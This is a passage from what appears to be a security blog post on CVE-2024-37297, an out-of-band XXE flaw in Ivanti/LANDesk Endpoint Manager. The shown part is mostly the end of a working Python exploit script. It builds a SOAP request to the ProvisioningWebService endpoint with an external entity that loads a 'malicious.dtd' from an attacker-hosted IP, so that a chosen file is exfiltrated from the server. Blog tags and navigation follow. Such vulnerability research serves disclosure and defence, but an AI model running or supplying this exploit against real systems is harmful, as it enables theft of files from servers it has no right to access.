</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">      &lt;SetActionStatus xmlns=&#34;http://tempuri.org/&#34;&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        &lt;historyTaskIDN&gt;100&lt;/historyTaskIDN&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        &lt;historyEntryIDN&gt;</span><span style="color:#e6db74">{}</span><span style="color:#e6db74">&lt;/historyEntryIDN&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        &lt;nextHistoryEntryIDN&gt;0&lt;/nextHistoryEntryIDN&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        &lt;actionState&gt;NEED_REBOOT&lt;/actionState&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        &lt;internalRetval&gt;1&lt;/internalRetval&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        &lt;externalRetval&gt;1&lt;/externalRetval&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        &lt;strCapturedText&gt;string&lt;/strCapturedText&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        &lt;Variables&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">          &lt;UserVariable&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">            &lt;Name&gt;string&lt;/Name&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">            &lt;Value&gt;string&lt;/Value&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">            &lt;VariableOperation&gt;add&lt;/VariableOperation&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">          &lt;/UserVariable&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">          &lt;UserVariable&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">            &lt;Name&gt;string&lt;/Name&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">            &lt;Value&gt;string&lt;/Value&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">            &lt;VariableOperation&gt;add&lt;/VariableOperation&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">          &lt;/UserVariable&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        &lt;/Variables&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        &lt;actionXml&gt;&lt;![CDATA[
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  &lt;!DOCTYPE a [
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  &lt;!ENTITY </span><span style="color:#e6db74">% a</span><span style="color:#e6db74">sd SYSTEM &#34;http://</span><span style="color:#e6db74">{}</span><span style="color:#e6db74">/malicious.dtd&#34;&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  </span><span style="color:#e6db74">%a</span><span style="color:#e6db74">sd;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  </span><span style="color:#e6db74">%c</span><span style="color:#e6db74">; 
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  ]&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  &lt;a&gt;&lt;/a&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  ]]&gt;&lt;/actionXml&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">      &lt;/SetActionStatus&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    &lt;/soap:Body&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  &lt;/soap:Envelope&gt;&#39;&#39;&#39;</span><span style="color:#f92672">.</span>format(historyEntryIDN, local_ip)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#75715e"># Define the headers</span>
</span></span><span style="display:flex;"><span>  headers <span style="color:#f92672">=</span> {
</span></span><span style="display:flex;"><span>      <span style="color:#e6db74">&#34;Content-Type&#34;</span>: <span style="color:#e6db74">&#34;text/xml; charset=utf-8&#34;</span>,
</span></span><span style="display:flex;"><span>      <span style="color:#e6db74">&#34;Soapaction&#34;</span>: <span style="color:#e6db74">&#39;&#34;http://tempuri.org/SetActionStatus&#34;&#39;</span>
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#75715e"># The target URL</span>
</span></span><span style="display:flex;"><span>  log(<span style="color:#e6db74">&#34;Sending Request.....&#34;</span>, <span style="color:#e6db74">&#34;log&#34;</span>)
</span></span><span style="display:flex;"><span>  url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{}</span><span style="color:#e6db74">/LANDesk/ManagementSuite/Core/ProvisioningWebService/WebService.asmx&#34;</span><span style="color:#f92672">.</span>format(target_url)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#75715e"># Send the POST request</span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">try</span>:
</span></span><span style="display:flex;"><span>    response <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>post(url, data<span style="color:#f92672">=</span>soap_payload, headers<span style="color:#f92672">=</span>headers, verify<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>)
</span></span><span style="display:flex;"><span>  <span style="color:#75715e"># Print the response from the server</span>
</span></span><span style="display:flex;"><span>    log(<span style="color:#e6db74">&#34;Request Successfully Sent!&#34;</span>, <span style="color:#e6db74">&#34;success&#34;</span>)
</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Response Status Code: </span><span style="color:#e6db74">{</span>response<span style="color:#f92672">.</span>status_code<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34;Response Content:&#34;</span>)
</span></span><span style="display:flex;"><span>    print(response<span style="color:#f92672">.</span>text)
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">Exception</span> <span style="color:#66d9ef">as</span> E:
</span></span><span style="display:flex;"><span>    log(<span style="color:#e6db74">&#34;Error occured: </span><span style="color:#e6db74">{}</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span>format(E), <span style="color:#e6db74">&#34;log&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">main</span>():
</span></span><span style="display:flex;"><span>    parser <span style="color:#f92672">=</span> argparse<span style="color:#f92672">.</span>ArgumentParser(description<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;XXE Exploit Script&#34;</span>)
</span></span><span style="display:flex;"><span>    parser<span style="color:#f92672">.</span>add_argument(<span style="color:#e6db74">&#34;target_url&#34;</span>, help<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Target URL of the web service&#34;</span>)
</span></span><span style="display:flex;"><span>    parser<span style="color:#f92672">.</span>add_argument(<span style="color:#e6db74">&#34;file_path&#34;</span>, help<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Path of the file to exfiltrate&#34;</span>)
</span></span><span style="display:flex;"><span>    parser<span style="color:#f92672">.</span>add_argument(<span style="color:#e6db74">&#34;local_ip&#34;</span>, help<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Local IP address for DTD hosting&#34;</span>)
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    args <span style="color:#f92672">=</span> parser<span style="color:#f92672">.</span>parse_args()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Create the malicious DTD</span>
</span></span><span style="display:flex;"><span>    create_malicious_dtd(args<span style="color:#f92672">.</span>file_path, args<span style="color:#f92672">.</span>local_ip)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Start the HTTP server in a separate thread</span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Send the SOAP request</span>
</span></span><span style="display:flex;"><span>    send_soap_request(args<span style="color:#f92672">.</span>target_url, args<span style="color:#f92672">.</span>local_ip)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;__main__&#34;</span>:
</span></span><span style="display:flex;"><span>    print_banner()
</span></span><span style="display:flex;"><span>    main()
</span></span></code></pre></div>
		</div>
		<footer class="post__footer">
			
<div class="post__tags tags clearfix">
	<svg class="tags__badge icon icon-tag" width="16" height="16" viewBox="0 0 32 32"><path d="M4 0h8s2 0 4 2l15 15s2 2 0 4L21 31s-2 2-4 0L2 16s-2-2-2-4V3s0-3 4-3m3 10a3 3 0 0 0 0-6 3 3 0 0 0 0 6"/></svg>
	<ul class="tags__list">
		<li class="tags__item">
			<a class="tags__link btn" href="/tags/cve-2024-37297/" rel="tag">CVE-2024-37297</a>
		</li>
		<li class="tags__item">
			<a class="tags__link btn" href="/tags/.net/" rel="tag">.NET</a>
		</li>
		<li class="tags__item">
			<a class="tags__link btn" href="/tags/oob-xxe/" rel="tag">OOB-XXE</a>
		</li>
		<li class="tags__item">
			<a class="tags__link btn" href="/tags/xxe/" rel="tag">XXE</a>
		</li>
	</ul>
</div>
		</footer>
	</article>
</main>

<div class="authorbox clearfix">
	<p class="authorbox__warning">
		<strong>WARNING:</strong> Authorbox is activated, but [Author] parameters are not specified.
	</p>
</div>

<nav class="pager flex">
	<div class="pager__item pager__item--prev">
		<a class="pager__link" href="/posts/crushftp-cve-2024-4040/" rel="prev">
			<span class="pager__subtitle">«&thinsp;Previous</span>
			<p class="pager__title">CVE 2024-4040 - CrushFTP Server-Side Template Injection Vulnerability Analysis</p>
		</a>
	</div>
	<div class="pager__item pager__item--next">
		<a class="pager__link" href="/posts/hpe-irs-cve-deep-dive/" rel="next">
			<span class="pager__subtitle">Next&thinsp;»</span>
			<p class="pager__title">Exploring Recent CVEs in HPE Insight Remote Support</p>
		</a>
	</div>
</nav>


			</div>
			<aside class="sidebar"><div class="widget-search widget">
	<form class="widget-search__form" role="search" method="get" action="https://google.com/search">
		<input class="widget-search__field" type="search" placeholder="Search…" value="" name="q" aria-label="Search…">
		<input class="widget-search__submit" type="submit" value="Search">
		<input type="hidden" name="sitesearch" value="http://localhost:1313/">
	</form>
</div>
<div class="widget-recent widget">
	<h4 class="widget__title">Recent Posts</h4>
	<div class="widget__content">
		<ul class="widget__list">
			<li class="widget__item"><a class="widget__link" href="/posts/crushftp-cve-2025-2825/">CVE 2025-2825 - CrushFTP Authentication Bypass Analysis</a></li>
			<li class="widget__item"><a class="widget__link" href="/posts/hpe-irs-cve-deep-dive/">Exploring Recent CVEs in HPE Insight Remote Support</a></li>
			<li class="widget__item"><a class="widget__link" href="/posts/ivanti-endpoint-manager-xxe-cve-2024-37397/">CVE 2024-37397 - Ivanti Endpoint Manager XXE Vulnerability</a></li>
			<li class="widget__item"><a class="widget__link" href="/posts/crushftp-cve-2024-4040/">CVE 2024-4040 - CrushFTP Server-Side Template Injection Vulnerability Analysis</a></li>
		</ul>
	</div>
</div>
<div class="widget-categories widget">
	<h4 class="widget__title">Categories</h4>
	<div class="widget__content">
		<ul class="widget__list">
			<li class="widget__item">
				<a class="widget__link" href="/categories/cve-analysis/">CVE Analysis</a></li>
		</ul>
	</div>
</div>
<div class="widget-taglist widget">
	<h4 class="widget__title">Tags</h4>
	<div class="widget__content">
		<a class="widget-taglist__link widget__link btn" href="/tags/java/" title="Java">Java (3)</a>
		<a class="widget-taglist__link widget__link btn" href="/tags/rce/" title="RCE">RCE (2)</a>
		<a class="widget-taglist__link widget__link btn" href="/tags/xxe/" title="XXE">XXE (2)</a>
		<a class="widget-taglist__link widget__link btn" href="/tags/.net/" title=".NET">.NET (1)</a>
		<a class="widget-taglist__link widget__link btn" href="/tags/auth-bypass/" title="Auth-Bypass">Auth-Bypass (1)</a>
		<a class="widget-taglist__link widget__link btn" href="/tags/cve-2024-37297/" title="CVE-2024-37297">CVE-2024-37297 (1)</a>
		<a class="widget-taglist__link widget__link btn" href="/tags/cve-2024-4040/" title="Cve-2024-4040">Cve-2024-4040 (1)</a>
		<a class="widget-taglist__link widget__link btn" href="/tags/cve-2024-53675/" title="CVE-2024-53675">CVE-2024-53675 (1)</a>
		<a class="widget-taglist__link widget__link btn" href="/tags/cve-2024-53676/" title="CVE-2024-53676">CVE-2024-53676 (1)</a>
		<a class="widget-taglist__link widget__link btn" href="/tags/cve-2025-2825/" title="CVE-2025-2825">CVE-2025-2825 (1)</a>
		<a class="widget-taglist__link widget__link btn" href="/tags/logic-flaw/" title="Logic-Flaw">Logic-Flaw (1)</a>
		<a class="widget-taglist__link widget__link btn" href="/tags/oob-xxe/" title="OOB-XXE">OOB-XXE (1)</a>
		<a class="widget-taglist__link widget__link btn" href="/tags/path-traversal/" title="Path Traversal">Path Traversal (1)</a>
		<a class="widget-taglist__link widget__link btn" href="/tags/ssti/" title="SSTI">SSTI (1)</a>
	</div>
</div>

</aside>
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2025 .
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>
	</div>
<script async defer src="/js/menu.js"></script>

<script src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.6/MathJax.js?config=TeX-AMS-MML_HTMLorMML" async></script>
</body>
</html>